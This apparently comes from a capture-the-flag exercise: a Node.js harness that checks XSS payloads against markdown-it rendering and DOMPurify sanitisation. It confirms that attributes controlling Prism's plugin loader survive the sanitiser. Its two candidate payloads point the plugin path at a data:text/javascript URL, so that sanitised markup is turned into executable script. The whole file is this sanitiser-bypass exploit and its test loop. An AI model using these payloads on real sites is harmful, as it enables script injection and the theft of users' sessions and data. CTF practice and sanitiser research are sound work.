const path = require('path');
const { JSDOM } = require(path.resolve(__dirname, '..', 'challenge_mouse', 'app', 'node_modules', 'jsdom'));
const MarkdownIt = require(path.resolve(__dirname, '..', 'challenge_mouse', 'app', 'node_modules', 'markdown-it'));
const DOMPurify = require(path.resolve(__dirname, '..', 'challenge_mouse', 'app', 'node_modules', 'dompurify'))(new JSDOM('').window);
const md = new MarkdownIt({ html: true, linkify: false });

function testPayload(body) {
    const rendered = DOMPurify.sanitize(md.render(body));
    const dom = new JSDOM(rendered);
    const doc = dom.window.document;
    const p1 = doc.querySelector('[data-prism-plugins]');
    const p2 = doc.querySelector('[data-prism-plugin-path]');
    const pluginsVal = p1 ? p1.getAttribute('data-prism-plugins') : null;
    const pathVal = p2 ? p2.getAttribute('data-prism-plugin-path') : null;
    
    if (pluginsVal === null || pathVal === null) return { len: body.length, ok: false, reason: 'missing attr', rendered };
    let pathStr = pathVal.endsWith('/') ? pathVal : pathVal + '/';
    let e = pluginsVal.split(',')[0].trim();
    let importUrl = pathStr + e + '.js';
    return {
        len: body.length,
        ok: true,
        pluginsVal,
        pathVal,
        importUrl
    };
}

const candidates = [
    '<a data-prism-plugins data-prism-plugin-path=data:text/javascript,import(name)//>',
    '<a data-prism-plugins data-prism-plugin-path="data:text/javascript,import(name)//">',
];

for (const c of candidates) {
    console.log(JSON.stringify(testPayload(c)));
}
